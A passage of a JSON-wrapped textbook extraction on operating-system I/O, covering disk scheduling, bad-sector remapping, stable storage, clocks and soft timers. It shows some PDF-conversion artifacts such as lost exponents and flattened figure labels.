middle may get poor service. The goals of minimal response\r\ntime and fairness are in conflict here.\r\nTall buildings also have to deal with this trade-off. The problem of scheduling\r\nan elevator in a tall building is similar to that of scheduling a disk arm. Requests\r\ncome in continuously calling the elevator to floors (cylinders) at random. The com\u0002puter running the elevator could easily keep track of the sequence in which cus\u0002tomers pushed the call button and service them using FCFS or SSF.\r\nHowever, most elevators use a different algorithm in order to reconcile the\r\nmutually conflicting goals of efficiency and fairness. They keep moving in the\r\nsame direction until there are no more outstanding requests in that direction, then\r\nthey switch directions. This algorithm, known both in the disk world and the ele\u0002vator world as the elevator algorithm, requires the software to maintain 1 bit: the\r\ncurrent direction bit, UP or DOWN. When a request finishes, the disk or elevator\r\ndriver checks the bit. If it is UP, the arm or cabin is moved to the next highest\r\npending request. If no requests are pending at higher positions, the direction bit is\r\nreversed. When the bit is set to DOWN, the move is to the next lowest requested\r\nposition, if any. If no request is pending, it just stops and waits.\nSEC. 5.4 DISKS 381\r\nFigure 5-25 shows the elevator algorithm using the same seven requests as\r\nFig. 5-24, assuming the direction bit was initially UP. The order in which the cyl\u0002inders are serviced is 12, 16, 34, 36, 9, and 1, which yields arm motions of 1, 4, 18,\r\n2, 27, and 8, for a total of 60 cylinders. In this case the elevator algorithm is slight\u0002ly better than SSF, although it is usually worse. One nice property the elevator al\u0002gorithm has is that given any collection of requests, the upper bound on the total\r\nmotion is fixed: it is just twice the number of cylinders.\r\nInitial\r\nposition\r\nCylinder\r\nX X XX X X X\r\n0 5 10 15 20 25 30 35\r\nTime\r\nSequence of seeks\r\nFigure 5-25. The elevator algorithm for scheduling disk requests.\r\nA slight modification of this algorithm that has a smaller variance in response\r\ntimes (Teory, 1972) is to always scan in the same direction. When the highest-num\u0002bered cylinder with a pending request has been serviced, the arm goes to the\r\nlowest-numbered cylinder with a pending request and then continues moving in an\r\nupward direction. In effect, the lowest-numbered cylinder is thought of as being\r\njust above the highest-numbered cylinder.\r\nSome disk controllers provide a way for the software to inspect the current sec\u0002tor number under the head. With such a controller, another optimization is pos\u0002sible. If two or more requests for the same cylinder are pending, the driver can\r\nissue a request for the sector that will pass under the head next. Note that when\r\nmultiple tracks are present in a cylinder, consecutive requests can be for different\r\ntracks with no penalty. The controller can select any of its heads almost in\u0002stantaneously (head selection involves neither arm motion nor rotational delay).\r\nIf the disk has the property that seek time is much faster than the rotational\r\ndelay, then a different optimization should be used. Pending requests should be\r\nsorted by sector number, and as soon as the next sector is about to pass under the\r\nhead, the arm should be zipped over to the right track to read or write it.\r\nWith a modern hard disk, the seek and rotational delays so dominate per\u0002formance that reading one or two sectors at a time is very inefficient. For this rea\u0002son, many disk controllers always read and cache multiple sectors, even when only\r\none is requested. Typically any request to read a sector will cause that sector and\r\nmuch or all the rest of the current track to be read, depending upon how much\n382 INPUT/OUTPUT CHAP. 5\r\nspace is available in the controller’s cache memory. The hard disk described in Fig.\r\n5-18 has a 4-MB cache, for example. The use of the cache is determined dynam\u0002ically by the controller. In its simplest mode, the cache is divided into two sections,\r\none for reads and one for writes. If a subsequent read can be satisfied out of the\r\ncontroller’s cache, it can return the requested data immediately.\r\nIt is worth noting that the disk controller’s cache is completely independent of\r\nthe operating system’s cache. The controller’s cache usually holds blocks that have\r\nnot actually been requested, but which were convenient to read because they just\r\nhappened to pass under the head as a side effect of some other read. In contrast,\r\nany cache maintained by the operating system will consist of blocks that were ex\u0002plicitly read and which the operating system thinks might be needed again in the\r\nnear future (e.g., a disk block holding a directory block).\r\nWhen several drives are present on the same controller, the operating system\r\nshould maintain a pending request table for each drive separately. Whenever any\r\ndrive is idle, a seek should be issued to move its arm to the cylinder where it will\r\nbe needed next (assuming the controller allows overlapped seeks). When the cur\u0002rent transfer finishes, a check can be made to see if any drives are positioned on the\r\ncorrect cylinder. If one or more are, the next transfer can be started on a drive that\r\nis already on the right cylinder. If none of the arms is in the right place, the driver\r\nshould issue a new seek on the drive that just completed a transfer and wait until\r\nthe next interrupt to see which arm gets to its destination first.\r\nIt is important to realize that all of the above disk-scheduling algorithms tacitly\r\nassume that the real disk geometry is the same as the virtual geometry. If it is not,\r\nthen scheduling disk requests makes no sense because the operating system cannot\r\nreally tell whether cylinder 40 or cylinder 200 is closer to cylinder 39. On the\r\nother hand, if the disk controller can accept multiple outstanding requests, it can\r\nuse these scheduling algorithms internally. In that case, the algorithms are still\r\nvalid, but one level down, inside the controller."
          },
          "5.4.4 Error Handling": {
            "page": 413,
            "content": "5.4.4 Error Handling\r\nDisk manufacturers are constantly pushing the limits of the technology by\r\nincreasing linear bit densities. A track midway out on a 5.25-inch disk has a cir\u0002cumference of about 300 mm. If the track holds 300 sectors of 512 bytes, the lin\u0002ear recording density may be about 5000 bits/mm taking into account the fact that\r\nsome space is lost to preambles, ECCs, and intersector gaps. Recording 5000\r\nbits/mm requires an extremely uniform substrate and a very fine oxide coating. Un\u0002fortunately, it is not possible to manufacture a disk to such specifications without\r\ndefects. As soon as manufacturing technology has improved to the point where it\r\nis possible to operate flawlessly at such densities, disk designers will go to higher\r\ndensities to increase the capacity. Doing so will probably reintroduce defects.\r\nManufacturing defects introduce bad sectors, that is, sectors that do not cor\u0002rectly read back the value just written to them. If the defect is very small, say, only\nSEC. 5.4 DISKS 383\r\na few bits, it is possible to use the bad sector and just let the ECC correct the errors\r\nev ery time. If the defect is bigger, the error cannot be masked.\r\nThere are two general approaches to bad blocks: deal with them in the con\u0002troller or deal with them in the operating system. In the former approach, before\r\nthe disk is shipped from the factory, it is tested and a list of bad sectors is written\r\nonto the disk. For each bad sector, one of the spares is substituted for it.\r\nThere are two ways to do this substitution. In Fig. 5-26(a), we see a single\r\ndisk track with 30 data sectors and two spares. Sector 7 is defective. What the con\u0002troller can do is remap one of the spares as sector 7 as shown in Fig. 5-26(b). The\r\nother way is to shift all the sectors up one, as shown in Fig. 5-26(c). In both cases\r\nthe controller has to know which sector is which. It can keep track of this infor\u0002mation through internal tables (one per track) or by rewriting the preambles to give\r\nthe remapped sector numbers. If the preambles are rewritten, the method of\r\nFig. 5-26(c) is more work (because 23 preambles must be rewritten) but ultimately\r\ngives better performance because an entire track can still be read in one rotation.\r\nSpare\r\nsectors Bad\r\nsector\r\n0 1 2 3\r\n4\r\n5\r\n6\r\n8\r\n9\r\n10\r\n11\r\n12\r\n13 14 17 16 15\r\n18\r\n19\r\n20\r\n21\r\n22\r\n23\r\n24\r\n25\r\n26\r\n27\r\n28\r\n29\r\n(a)\r\nReplacement\r\nsector\r\n0 1 2 3\r\n4\r\n5\r\n6\r\n8\r\n9\r\n10\r\n11\r\n12\r\n13 14 17 16 15\r\n18\r\n19\r\n20\r\n21\r\n22\r\n23\r\n24\r\n25\r\n26\r\n27\r\n28\r\n29 7\r\n(b)\r\n0 1 2 3\r\n4\r\n5\r\n6\r\n7\r\n8\r\n9\r\n10\r\n11\r\n12 13 16 15 14\r\n17\r\n18\r\n19\r\n20\r\n21\r\n22\r\n23\r\n24\r\n25\r\n26\r\n27\r\n2829\r\n(c)\r\nFigure 5-26. (a) A disk track with a bad sector. (b) Substituting a spare for the\r\nbad sector. (c) Shifting all the sectors to bypass the bad one.\r\nErrors can also develop during normal operation after the drive has been in\u0002stalled. The first line of defense upon getting an error that the ECC cannot handle\r\nis to just try the read again. Some read errors are transient, that is, are caused by\r\nspecks of dust under the head and will go away on a second attempt. If the con\u0002troller notices that it is getting repeated errors on a certain sector, it can switch to a\r\nspare before the sector has died completely. In this way, no data are lost and the\r\noperating system and user do not even notice the problem. Usually, the method of\r\nFig. 5-26(b) has to be used since the other sectors might now contain data. Using\r\nthe method of Fig. 5-26(c) would require not only rewriting the preambles, but\r\ncopying all the data as well.\r\nEarlier we said there were two general approaches to handling errors: handle\r\nthem in the controller or in the operating system. If the controller does not have\r\nthe capability to transparently remap sectors as we have discussed, the operating\n384 INPUT/OUTPUT CHAP. 5\r\nsystem must do the same thing in software. This means that it must first acquire a\r\nlist of bad sectors, either by reading them from the disk, or simply testing the entire\r\ndisk itself. Once it knows which sectors are bad, it can build remapping tables. If\r\nthe operating system wants to use the approach of Fig. 5-26(c), it must shift the\r\ndata in sectors 7 through 29 up one sector.\r\nIf the operating system is handling the remapping, it must make sure that bad\r\nsectors do not occur in any files and also do not occur in the free list or bitmap.\r\nOne way to do this is to create a secret file consisting of all the bad sectors. If this\r\nfile is not entered into the file system, users will not accidentally read it (or worse\r\nyet, free it).\r\nHowever, there is still another problem: backups. If the disk is backed up file\r\nby file, it is important that the backup utility not try to copy the bad block file. To\r\nprevent this, the operating system has to hide the bad block file so well that even a\r\nbackup utility cannot find it. If the disk is backed up sector by sector rather than\r\nfile by file, it will be difficult, if not impossible, to prevent read errors during back\u0002up. The only hope is that the backup program has enough smarts to give up after 10\r\nfailed reads and continue with the next sector.\r\nBad sectors are not the only source of errors. Seek errors caused by mechanical\r\nproblems in the arm also occur. The controller keeps track of the arm position in\u0002ternally. To perform a seek, it issues a command to the arm motor to move the arm\r\nto the new cylinder. When the arm gets to its destination, the controller reads the\r\nactual cylinder number from the preamble of the next sector. If the arm is in the\r\nwrong place, a seek error has occurred.\r\nMost hard disk controllers correct seek errors automatically, but most of the\r\nold floppy controllers used in the 1980s and 1990s just set an error bit and left the\r\nrest to the driver. The driver handled this error by issuing a recalibrate command,\r\nto move the arm as far out as it would go and reset the controller’s internal idea of\r\nthe current cylinder to 0. Usually this solved the problem. If it did not, the drive\r\nhad to be repaired.\r\nAs we have just seen, the controller is really a specialized little computer, com\u0002plete with software, variables, buffers, and occasionally, bugs. Sometimes an unu\u0002sual sequence of events, such as an interrupt on one drive occurring simultaneously\r\nwith a recalibrate command for another drive will trigger a bug and cause the con\u0002troller to go into a loop or lose track of what it was doing. Controller designers us\u0002ually plan for the worst and provide a pin on the chip which, when asserted, forces\r\nthe controller to forget whatever it was doing and reset itself. If all else fails, the\r\ndisk driver can set a bit to invoke this signal and reset the controller. If that does\r\nnot help, all the driver can do is print a message and give up.\r\nRecalibrating a disk makes a funny noise but otherwise normally is not disturb\u0002ing. However, there is one situation where recalibration is a problem: systems with\r\nreal-time constraints. When a video is being played off (or served from) a hard\r\ndisk, or files from a hard disk are being burned onto a Blu-ray disc, it is essential\r\nthat the bits arrive from the hard disk at a uniform rate. Under these circumstances,\nSEC. 5.4 DISKS 385\r\nrecalibrations insert gaps into the bit stream and are unacceptable. Special drives,\r\ncalled AV disks (Audio Visual disks), which never recalibrate are available for\r\nsuch applications.\r\nAnecdotally, a highly convincing demonstration of how advanced disk con\u0002trollers have become was given by the Dutch hacker Jeroen Domburg, who hacked\r\na modern disk controller to make it run custom code. It turns out the disk controller\r\nis equipped with a fairly powerful multicore (!) ARM processor and has easily\r\nenough resources to run Linux. If the bad guys hack your hard drive in this way,\r\nthey will be able to see and modify all data you transfer to and from the disk. Even\r\nreinstalling the operating from scratch will not remove the infection, as the disk\r\ncontroller itself is malicious and serves as a permanent backdoor. Alternatively,\r\nyou can collect a stack of broken hard drives from your local recycling center and\r\nbuild your own cluster computer for free."
          },
          "5.4.5 Stable Storage": {
            "page": 416,
            "content": "5.4.5 Stable Storage\r\nAs we have seen, disks sometimes make errors. Good sectors can suddenly be\u0002come bad sectors. Whole drives can die unexpectedly. RAIDs protect against a\r\nfew sectors going bad or even a drive falling out. However, they do not protect\r\nagainst write errors laying down bad data in the first place. They also do not pro\u0002tect against crashes during writes corrupting the original data without replacing\r\nthem by newer data.\r\nFor some applications, it is essential that data never be lost or corrupted, even\r\nin the face of disk and CPU errors. Ideally, a disk should simply work all the time\r\nwith no errors. Unfortunately, that is not achievable. What is achievable is a disk\r\nsubsystem that has the following property: when a write is issued to it, the disk ei\u0002ther correctly writes the data or it does nothing, leaving the existing data intact.\r\nSuch a system is called stable storage and is implemented in software (Lampson\r\nand Sturgis, 1979). The goal is to keep the disk consistent at all costs. Below we\r\nwill describe a slight variant of the original idea.\r\nBefore describing the algorithm, it is important to have a clear model of the\r\npossible errors. The model assumes that when a disk writes a block (one or more\r\nsectors), either the write is correct or it is incorrect and this error can be detected\r\non a subsequent read by examining the values of the ECC fields. In principle,\r\nguaranteed error detection is never possible because with a, say, 16-byte ECC field\r\nguarding a 512-byte sector, there are 24096 data values and only 2144 ECC values.\r\nThus if a block is garbled during writing but the ECC is not, there are billions upon\r\nbillions of incorrect combinations that yield the same ECC. If any of them occur,\r\nthe error will not be detected. On the whole, the probability of random data having\r\nthe proper 16-byte ECC is about 2−144, which is small enough that we will call it\r\nzero, even though it is really not.\r\nThe model also assumes that a correctly written sector can spontaneously go\r\nbad and become unreadable. However, the assumption is that such events are so\n386 INPUT/OUTPUT CHAP. 5\r\nrare that having the same sector go bad on a second (independent) drive during a\r\nreasonable time interval (e.g., 1 day) is small enough to ignore.\r\nThe model also assumes the CPU can fail, in which case it just stops. Any disk\r\nwrite in progress at the moment of failure also stops, leading to incorrect data in\r\none sector and an incorrect ECC that can later be detected. Under all these condi\u0002tions, stable storage can be made 100% reliable in the sense of writes either work\u0002ing correctly or leaving the old data in place. Of course, it does not protect against\r\nphysical disasters, such as an earthquake happening and the computer falling 100\r\nmeters into a fissure and landing in a pool of boiling magma. It is tough to recover\r\nfrom this condition in software.\r\nStable storage uses a pair of identical disks with the corresponding blocks\r\nworking together to form one error-free block. In the absence of errors, the corres\u0002ponding blocks on both drives are the same. Either one can be read to get the same\r\nresult. To achieve this goal, the following three operations are defined:\r\n1. Stable writes. A stable write consists of first writing the block on\r\ndrive 1, then reading it back to verify that it was written correctly. If\r\nit was not, the write and reread are done again up to n times until they\r\nwork. After n consecutive failures, the block is remapped onto a spare\r\nand the operation repeated until it succeeds, no matter how many\r\nspares have to be tried. After the write to drive 1 has succeeded, the\r\ncorresponding block on drive 2 is written and reread, repeatedly if\r\nneed be, until it, too, finally succeeds. In the absence of CPU crashes,\r\nwhen a stable write completes, the block has correctly been written\r\nonto both drives and verified on both of them.\r\n2. Stable reads. A stable read first reads the block from drive 1. If this\r\nyields an incorrect ECC, the read is tried again, up to n times. If all\r\nof these give bad ECCs, the corresponding block is read from drive 2.\r\nGiven the fact that a successful stable write leaves two good copies of\r\nthe block behind, and our assumption that the probability of the same\r\nblock spontaneously going bad on both drives in a reasonable time in\u0002terval is negligible, a stable read always succeeds.\r\n3. Crash recovery. After a crash, a recovery program scans both disks\r\ncomparing corresponding blocks. If a pair of blocks are both good\r\nand the same, nothing is done. If one of them has an ECC error, the\r\nbad block is overwritten with the corresponding good block. If a pair\r\nof blocks are both good but different, the block from drive 1 is written\r\nonto drive 2.\r\nIn the absence of CPU crashes, this scheme always works because stable\r\nwrites always write two valid copies of every block and spontaneous errors are as\u0002sumed never to occur on both corresponding blocks at the same time. What about\nSEC. 5.4 DISKS 387\r\nin the presence of CPU crashes during stable writes? It depends on precisely when\r\nthe crash occurs. There are fiv e possibilities, as depicted in Fig. 5-27.\r\nOld\r\n1\r\nOld\r\n2\r\nDisk\r\n1\r\nOld\r\n2\r\nDisk\r\nNew\r\n1\r\nOld\r\n2\r\nDisk\r\nNew\r\n1 2\r\nDisk\r\nNew\r\n1\r\nNew\r\n2\r\nDisk\r\nCrash Crash Crash Crash Crash\r\n(a) (b) (c) (d) (e)\r\nECC\r\nerror\r\nFigure 5-27. Analysis of the influence of crashes on stable writes.\r\nIn Fig. 5-27(a), the CPU crash happens before either copy of the block is writ\u0002ten. During recovery, neither will be changed and the old value will continue to\r\nexist, which is allowed.\r\nIn Fig. 5-27(b), the CPU crashes during the write to drive 1, destroying the\r\ncontents of the block. However the recovery program detects this error and restores\r\nthe block on drive 1 from drive 2. Thus the effect of the crash is wiped out and the\r\nold state is fully restored.\r\nIn Fig. 5-27(c), the CPU crash happens after drive 1 is written but before drive\r\n2 is written. The point of no return has been passed here: the recovery program\r\ncopies the block from drive 1 to drive 2. The write succeeds.\r\nFig. 5-27(d) is like Fig. 5-27(b): during recovery, the good block overwrites the\r\nbad block. Again, the final value of both blocks is the new one.\r\nFinally, in Fig. 5-27(e) the recovery program sees that both blocks are the\r\nsame, so neither is changed and the write succeeds here, too.\r\nVarious optimizations and improvements are possible to this scheme. For\r\nstarters, comparing all the blocks pairwise after a crash is doable, but expensive. A\r\nhuge improvement is to keep track of which block was being written during a sta\u0002ble write so that only one block has to be checked during recovery. Some com\u0002puters have a small amount of nonvolatile RAM, which is a special CMOS memo\u0002ry powered by a lithium battery. Such batteries last for years, possibly even the\r\nwhole life of the computer. Unlike main memory, which is lost after a crash, non\u0002volatile RAM is not lost after a crash. The time of day is normally kept here (and\r\nincremented by a special circuit), which is why computers still know what time it\r\nis even after having been unplugged.\r\nSuppose that a few bytes of nonvolatile RAM are available for operating sys\u0002tem purposes. The stable write can put the number of the block it is about to update\r\nin nonvolatile RAM before starting the write. After successfully completing the\r\nstable write, the block number in nonvolatile RAM is overwritten with an invalid\n388 INPUT/OUTPUT CHAP. 5\r\nblock number, for example, −1. Under these conditions, after a crash the recovery\r\nprogram can check the nonvolatile RAM to see if a stable write happened to be in\r\nprogress during the crash, and if so, which block was being written when the\r\ncrashed happened. The two copies of the block can then be checked for correctness\r\nand consistency.\r\nIf nonvolatile RAM is not available, it can be simulated as follows. At the start\r\nof a stable write, a fixed disk block on drive 1 is overwritten with the number of\r\nthe block to be stably written. This block is then read back to verify it. After get\u0002ting it correct, the corresponding block on drive 2 is written and verified. When the\r\nstable write completes correctly, both blocks are overwritten with an invalid block\r\nnumber and verified. Again here, after a crash it is easy to determine whether or\r\nnot a stable write was in progress during the crash. Of course, this technique re\u0002quires eight extra disk operations to write a stable block, so it should be used\r\nexceedingly sparingly.\r\nOne last point is worth making. We assumed that only one spontaneous decay\r\nof a good block to a bad block happens per block pair per day. If enough days go\r\nby, the other one might go bad, too. Therefore, once a day a complete scan of both\r\ndisks must be done, repairing any damage. That way, every morning both disks are\r\nalways identical. Even if both blocks in a pair go bad within a period of a few\r\ndays, all errors are repaired correctly."
          }
        }
      },
      "5.5 CLOCKS": {
        "page": 419,
        "children": {
          "5.5.1 Clock Hardware": {
            "page": 419,
            "content": "5.5.1 Clock Hardware\r\nTw o types of clocks are commonly used in computers, and both are quite dif\u0002ferent from the clocks and watches used by people. The simpler clocks are tied to\r\nthe 110- or 220-volt power line and cause an interrupt on every voltage cycle, at 50\r\nor 60 Hz. These clocks used to dominate, but are rare nowadays.\r\nThe other kind of clock is built out of three components: a crystal oscillator, a\r\ncounter, and a holding register, as shown in Fig. 5-28. When a piece of quartz\r\ncrystal is properly cut and mounted under tension, it can be made to generate a\r\nperiodic signal of very great accuracy, typically in the range of several hundred\r\nmegahertz to a few gigahertz, depending on the crystal chosen. Using electronics,\nSEC. 5.5 CLOCKS 389\r\nthis base signal can be multiplied by a small integer to get frequencies up to several\r\ngigahertz or even more. At least one such circuit is usually found in any computer,\r\nproviding a synchronizing signal to the computer’s various circuits. This signal is\r\nfed into the counter to make it count down to zero. When the counter gets to zero,\r\nit causes a CPU interrupt.\r\nCrystal oscillator\r\nCounter is decremented at each pulse\r\nHolding register is used to load the counter\r\nFigure 5-28. A programmable clock.\r\nProgrammable clocks typically have sev eral modes of operation. In one-shot\r\nmode, when the clock is started, it copies the value of the holding register into the\r\ncounter and then decrements the counter at each pulse from the crystal. When the\r\ncounter gets to zero, it causes an interrupt and stops until it is explicitly started\r\nagain by the software. In square-wave mode, after getting to zero and causing the\r\ninterrupt, the holding register is automatically copied into the counter, and the\r\nwhole process is repeated again indefinitely. These periodic interrupts are called\r\nclock ticks.\r\nThe advantage of the programmable clock is that its interrupt frequency can be\r\ncontrolled by software. If a 500-MHz crystal is used, then the counter is pulsed\r\nev ery 2 nsec. With (unsigned) 32-bit registers, interrupts can be programmed to oc\u0002cur at intervals from 2 nsec to 8.6 sec. Programmable clock chips usually contain\r\ntwo or three independently programmable clocks and have many other options as\r\nwell (e.g., counting up instead of down, interrupts disabled, and more).\r\nTo prevent the current time from being lost when the computer’s power is\r\nturned off, most computers have a battery-powered backup clock, implemented\r\nwith the kind of low-power circuitry used in digital watches. The battery clock can\r\nbe read at startup. If the backup clock is not present, the software may ask the user\r\nfor the current date and time. There is also a standard way for a networked system\r\nto get the current time from a remote host. In any case the time is then translated\r\ninto the number of clock ticks since 12 A.M. UTC (Universal Coordinated Time)\r\n(formerly known as Greenwich Mean Time) on Jan. 1, 1970, as UNIX does, or\r\nsince some other benchmark moment. The origin of time for Windows is Jan. 1,\r\n1980. At ev ery clock tick, the real time is incremented by one count. Usually util\u0002ity programs are provided to manually set the system clock and the backup clock\r\nand to synchronize the two clocks.\n390 INPUT/OUTPUT CHAP. 5"
          },
          "5.5.2 Clock Software": {
            "page": 421,
            "content": "5.5.2 Clock Software\r\nAll the clock hardware does is generate interrupts at known intervals. Every\u0002thing else involving time must be done by the software, the clock driver. The exact\r\nduties of the clock driver vary among operating systems, but usually include most\r\nof the following:\r\n1. Maintaining the time of day.\r\n2. Preventing processes from running longer than they are allowed to.\r\n3. Accounting for CPU usage.\r\n4. Handling the alar m system call made by user processes.\r\n5. Providing watchdog timers for parts of the system itself.\r\n6. Doing profiling, monitoring, and statistics gathering.\r\nThe first clock function, maintaining the time of day (also called the real time)\r\nis not difficult. It just requires incrementing a counter at each clock tick, as men\u0002tioned before. The only thing to watch out for is the number of bits in the time-of\u0002day counter. With a clock rate of 60 Hz, a 32-bit counter will overflow in just over\r\n2 years. Clearly the system cannot store the real time as the number of ticks since\r\nJan. 1, 1970 in 32 bits.\r\nThree approaches can be taken to solve this problem. The first way is to use a\r\n64-bit counter, although doing so makes maintaining the counter more expensive\r\nsince it has to be done many times a second. The second way is to maintain the\r\ntime of day in seconds, rather than in ticks, using a subsidiary counter to count\r\nticks until a whole second has been accumulated. Because 232 seconds is more than\r\n136 years, this method will work until the twenty-second century.\r\nThe third approach is to count in ticks, but to do that relative to the time the\r\nsystem was booted, rather than relative to a fixed external moment. When the back\u0002up clock is read or the user types in the real time, the system boot time is calcu\u0002lated from the current time-of-day value and stored in memory in any convenient\r\nform. Later, when the time of day is requested, the stored time of day is added to\r\nthe counter to get the current time of day. All three approaches are shown in\r\nFig. 5-29.\r\nThe second clock function is preventing processes from running too long.\r\nWhenever a process is started, the scheduler initializes a counter to the value of\r\nthat process’ quantum in clock ticks. At every clock interrupt, the clock driver\r\ndecrements the quantum counter by 1. When it gets to zero, the clock driver calls\r\nthe scheduler to set up another process.\r\nThe third clock function is doing CPU accounting. The most accurate way to\r\ndo it is to start a second timer, distinct from the main system timer, whenever a\r\nprocess is started up. When that process is stopped, the timer can be read out to tell\nSEC. 5.5 CLOCKS 391\r\n(a) (b) (c)\r\nTime of day in ticks\r\nTime of day\r\nin seconds\r\nCounter in ticks\r\nSystem boot time\r\nin seconds\r\nNumber of ticks\r\nin current second\r\n64 bits 32 bits 32 bits\r\nFigure 5-29. Three ways to maintain the time of day.\r\nhow long the process has run. To do things right, the second timer should be saved\r\nwhen an interrupt occurs and restored afterward.\r\nA less accurate, but simpler, way to do accounting is to maintain a pointer to\r\nthe process table entry for the currently running process in a global variable. At\r\nev ery clock tick, a field in the current process’ entry is incremented. In this way,\r\nev ery clock tick is ‘‘charged’’ to the process running at the time of the tick. A\r\nminor problem with this strategy is that if many interrupts occur during a process’\r\nrun, it is still charged for a full tick, even though it did not get much work done.\r\nProperly accounting for the CPU during interrupts is too expensive and is rarely\r\ndone.\r\nIn many systems, a process can request that the operating system give it a\r\nwarning after a certain interval. The warning is usually a signal, interrupt, message,\r\nor something similar. One application requiring such warnings is networking, in\r\nwhich a packet not acknowledged within a certain time interval must be retrans\u0002mitted. Another application is computer-aided instruction, where a student not pro\u0002viding a response within a certain time is told the answer.\r\nIf the clock driver had enough clocks, it could set a separate clock for each re\u0002quest. This not being the case, it must simulate multiple virtual clocks with a single\r\nphysical clock. One way is to maintain a table in which the signal time for all\r\npending timers is kept, as well as a variable giving the time of the next one. When\u0002ev er the time of day is updated, the driver checks to see if the closest signal has oc\u0002curred. If it has, the table is searched for the next one to occur.\r\nIf many signals are expected, it is more efficient to simulate multiple clocks by\r\nchaining all the pending clock requests together, sorted on time, in a linked list, as\r\nshown in Fig. 5-30. Each entry on the list tells how many clock ticks following the\r\nprevious one to wait before causing a signal. In this example, signals are pending\r\nfor 4203, 4207, 4213, 4215, and 4216.\r\nIn Fig. 5-30, the next interrupt occurs in 3 ticks. On each tick, Next signal is\r\ndecremented. When it gets to 0, the signal corresponding to the first item on the list\r\nis caused, and that item is removed from the list. Then Next signal is set to the\r\nvalue in the entry now at the head of the list, in this example, 4.\n392 INPUT/OUTPUT CHAP. 5\r\nCurrent time Next signal\r\nClock\r\nheader\r\n3 4 6 2 1 X\r\n4200 3\r\nFigure 5-30. Simulating multiple timers with a single clock.\r\nNote that during a clock interrupt, the clock driver has several things to do—\r\nincrement the real time, decrement the quantum and check for 0, do CPU ac\u0002counting, and decrement the alarm counter. Howev er, each of these operations has\r\nbeen carefully arranged to be very fast because they hav e to be repeated many\r\ntimes a second.\r\nParts of the operating system also need to set timers. These are called watch\u0002dog timers and are frequently used (especially in embedded devices) to detect\r\nproblems such as hangs. For instance, a watchdog timer may reset a system that\r\nstops running. While the system is running, it regularly resets the timer, so that it\r\nnever expires. In that case, expiration of the timer proves that the system has not\r\nrun for a long time, and leads to corrective action—such as a full-system reset.\r\nThe mechanism used by the clock driver to handle watchdog timers is the same\r\nas for user signals. The only difference is that when a timer goes off, instead of\r\ncausing a signal, the clock driver calls a procedure supplied by the caller. The pro\u0002cedure is part of the caller’s code. The called procedure can do whatever is neces\u0002sary, even causing an interrupt, although within the kernel interrupts are often\r\ninconvenient and signals do not exist. That is why the watchdog mechanism is pro\u0002vided. It is worth nothing that the watchdog mechanism works only when the\r\nclock driver and the procedure to be called are in the same address space.\r\nThe last thing in our list is profiling. Some operating systems provide a mech\u0002anism by which a user program can have the system build up a histogram of its\r\nprogram counter, so it can see where it is spending its time. When profiling is a\r\npossibility, at every tick the driver checks to see if the current process is being pro\u0002filed, and if so, computes the bin number (a range of addresses) corresponding to\r\nthe current program counter. It then increments that bin by one. This mechanism\r\ncan also be used to profile the system itself."
          },
          "5.5.3 Soft Timers": {
            "page": 423,
            "content": "5.5.3 Soft Timers\r\nMost computers have a second programmable clock that can be set to cause\r\ntimer interrupts at whatever rate a program needs. This timer is in addition to the\r\nmain system timer whose functions were described above. As long as the interrupt\r\nfrequency is low, there is no problem using this second timer for application-spe\u0002cific purposes. The trouble arrives when the frequency of the application-specific\nSEC. 5.5 CLOCKS 393\r\ntimer is very high. Below we will briefly describe a software-based timer scheme\r\nthat works well under many circumstances, even at fairly high frequencies. The\r\nidea is due to Aron and Druschel (1999). For more details, please see their paper.\r\nGenerally, there are two ways to manage I/O: interrupts and polling. Interrupts\r\nhave low latency, that is, they happen immediately after the event itself with little\r\nor no delay. On the other hand, with modern CPUs, interrupts have a substantial\r\noverhead due to the need for context switching and their influence on the pipeline,\r\nTLB, and cache.\r\nThe alternative to interrupts is to have the application poll for the event expect\u0002ed itself. Doing this avoids interrupts, but there may be substantial latency because\r\nan event may happen directly after a poll, in which case it waits almost a whole\r\npolling interval. On the average, the latency is half the polling interval.\r\nInterrupt latency today is barely better than that of computers in the 1970s. On\r\nmost minicomputers, for example, an interrupt took four bus cycles: to stack the\r\nprogram counter and PSW and to load a new program counter and PSW. Now\u0002adays dealing with the pipeline, MMU, TLB, and cache adds a great deal to the\r\noverhead. These effects are likely to get worse rather than better in time, thus can\u0002celing out faster clock rates. Unfortunately, for certain applications, we want nei\u0002ther the overhead of interrupts nor the latency of polling.\r\nSoft timers avoid interrupts. Instead, whenever the kernel is running for some\r\nother reason, just before it returns to user mode it checks the real-time clock to see\r\nif a soft timer has expired. If it has expired, the scheduled event (e.g., packet trans\u0002mission or checking for an incoming packet) is performed, with no need to switch\r\ninto kernel mode since the system is already there. After the work has been per\u0002formed, the soft timer is reset to go off again. All that has to be done is copy the\r\ncurrent clock value to the timer and add the timeout interval to it.\r\nSoft timers stand or fall with the rate at which kernel entries are made for other\r\nreasons. These reasons include:\r\n1. System calls.\r\n2. TLB misses.\r\n3. Page faults.\r\n4. I/O interrupts.\r\n5. The CPU going idle.\r\nTo see how often these events happen, Aron and Druschel made measurements\r\nwith several CPU loads, including a fully loaded Web server, a Web server with a\r\ncompute-bound background job, playing real-time audio from the Internet, and\r\nrecompiling the UNIX kernel. The average entry rate into the kernel varied from 2\r\nto 18 μsec, with about half of these entries being system calls. Thus to a first-order\r\napproximation, having a soft timer go off, say, every 10 μsec is doable, albeit with\n394 INPUT/OUTPUT CHAP. 5\r\nan occasional missed deadline. Being 10 μsec late from time to time is often better\r\nthan having interrupts eat up 35% of the CPU.\r\nOf course, there will be periods when there are no system calls, TLB misses, or\r\npage faults, in which case no soft timers will go off. To put an upper bound on\r\nthese intervals, the second hardware timer can be set to go off, say, every 1 msec.\r\nIf the application can live with only 1000 activations per second for occasional in\u0002tervals, then the combination of soft timers and a low-frequency hardware timer\r\nmay be better than either pure interrupt-driven I/O or pure polling."
          }
        }
      },
      "5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR": {
        "page": 425,
        "children": {
          "5.6.1 Input Software": {
            "page": 425,
